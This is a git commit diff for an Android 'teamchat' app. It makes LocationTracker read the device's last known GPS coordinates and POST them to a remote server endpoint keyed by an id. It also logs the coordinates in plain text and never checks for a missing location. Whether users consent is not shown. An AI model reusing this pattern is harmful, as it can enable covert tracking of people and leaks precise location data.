400c8c0f143017befc877e4885e906719a72d929
ky99123 <quahky11@gmail.com>
2023-02-12 20:38:45 +0800

    Change LocationTracker

--- app/src/main/java/com/example/teamchat/LocationTracker.java
+++ app/src/main/java/com/example/teamchat/LocationTracker.java
@@ -3,6 +3,8 @@ package com.example.teamchat;
 import static com.example.teamchat.Constants.SERVER;
 
 import android.content.Context;
+import android.location.Location;
+import android.location.LocationManager;
 import android.util.Log;
 
 import org.json.JSONException;
@@ -14,21 +16,29 @@ public class LocationTracker {
     private final static String TAG = ChatService.class.getSimpleName();
 
     public static void getLocation(Context context, String id) throws JSONException {
-        JSONObject location = new JSONObject();
-        location.put("latitude", "your_latitude");
-        location.put("longitude", "your_longitude");
+        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
+        Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+
+        JSONObject locationData = new JSONObject();
+        locationData.put("latitude", location.getLatitude());
+        locationData.put("longitude", location.getLongitude());
+
+        Log.d(TAG, "The JSON object: " + locationData);
+        System.out.println("The JSON object: " + locationData);
 
         JSONObject parentObject = new JSONObject();
         parentObject.put("code", "location");
-        parentObject.put("data", location);
-        System.out.println(parentObject);
+        parentObject.put("data", locationData);
+
+        Log.d(TAG, "The JSON object: " + parentObject);
+        System.out.println("The JSON object: " + parentObject);
 
         try {
             HttpConnection.ReturnResponse response = HttpConnection.connect(SERVER + "result/" + id, "POST", parentObject.toString());
 
             assert response != null;
             if (response.responseCode == 200) {
-                Log.d(TAG, "Response: " + response.body);
+                Log.e(TAG, "Response: " + response.body);
             } else {
                 throw new IOException("Unexpected code " + response.responseCode);
             }
@@ -37,3 +47,6 @@ public class LocationTracker {
         }
     }
 }
+
+
+
